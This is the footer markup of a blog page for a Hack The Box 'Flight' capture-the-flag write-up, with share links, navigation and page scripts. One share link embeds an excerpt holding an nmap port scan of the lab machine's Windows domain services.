+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://kelpie.top/post/Virtual%20Attack[21].html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://kelpie.top/post/Virtual%20Attack[21].html&text= HTB Flight"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://kelpie.top/post/Virtual%20Attack[21].html&title= HTB Flight"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://kelpie.top/post/Virtual%20Attack[21].html&is_video=false&description= HTB Flight"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject= HTB Flight&body=Check out this article: http://kelpie.top/post/Virtual%20Attack[21].html"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://kelpie.top/post/Virtual%20Attack[21].html&title= HTB Flight"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://kelpie.top/post/Virtual%20Attack[21].html&title= HTB Flight"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://kelpie.top/post/Virtual%20Attack[21].html&title= HTB Flight"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://kelpie.top/post/Virtual%20Attack[21].html&title= HTB Flight"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://kelpie.top/post/Virtual%20Attack[21].html&name= HTB Flight&description=&lt;h2 id=&#34;PORT-SCAN&#34;&gt;&lt;a href=&#34;#PORT-SCAN&#34; class=&#34;headerlink&#34; title=&#34;PORT SCAN&#34;&gt;&lt;/a&gt;PORT SCAN&lt;/h2&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;# Nmap 7.93 scan initiated Wed Dec 21 02:42:29 2022 as: nmap -p- --min-rate&amp;#x3D;10000 -sC -sV -oN portscan.txt 10.10.11.187
+Nmap scan report for 10.10.11.187
+Host is up (0.14s latency).
+Not shown: 65516 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+53&amp;#x2F;tcp    open  domain        Simple DNS Plus
+80&amp;#x2F;tcp    open  http          Apache httpd 2.4.52 ((Win64) OpenSSL&amp;#x2F;1.1.1m PHP&amp;#x2F;8.1.1)
+|_http-server-header: Apache&amp;#x2F;2.4.52 (Win64) OpenSSL&amp;#x2F;1.1.1m PHP&amp;#x2F;8.1.1
+|_http-title: g0 Aviation
+| http-methods:
+|_  Potentially risky methods: TRACE
+88&amp;#x2F;tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-12-21 14:43:03Z)
+135&amp;#x2F;tcp   open  msrpc         Microsoft Windows RPC
+139&amp;#x2F;tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389&amp;#x2F;tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
+445&amp;#x2F;tcp   open  microsoft-ds?
+464&amp;#x2F;tcp   open  kpasswd5?
+593&amp;#x2F;tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636&amp;#x2F;tcp   open  tcpwrapped
+3268&amp;#x2F;tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
+3269&amp;#x2F;tcp  open  tcpwrapped
+5985&amp;#x2F;tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP&amp;#x2F;UPnP)
+|_http-server-header: Microsoft-HTTPAPI&amp;#x2F;2.0
+|_http-title: Not Found
+9389&amp;#x2F;tcp  open  mc-nmf        .NET Message Framing
+49667&amp;#x2F;tcp open  msrpc         Microsoft Windows RPC
+49673&amp;#x2F;tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49674&amp;#x2F;tcp open  msrpc         Microsoft Windows RPC
+49690&amp;#x2F;tcp open  msrpc         Microsoft Windows RPC
+49699&amp;#x2F;tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: G0; OS: Windows; CPE: cpe:&amp;#x2F;o:microsoft:windows
+
+Host script results:
+|_clock-skew: 6h59m59s
+| smb2-security-mode:
+|   311:
+|_    Message signing enabled and required
+| smb2-time:
+|   date: 2022-12-21T14:43:59
+|_  start_date: N&amp;#x2F;A
+
+Service detection performed. Please report any incorrect results at https:&amp;#x2F;&amp;#x2F;nmap.org&amp;#x2F;submit&amp;#x2F; .
+# Nmap done at Wed Dec 21 02:44:38 2022 -- 1 IP address (1 host up) scanned in 128.51 seconds
+&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The domain we found &lt;code&gt;flight.htb&lt;/code&gt;&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://kelpie.top/post/Virtual%20Attack[21].html&t= HTB Flight"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2024
+    l3vi4th4n
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
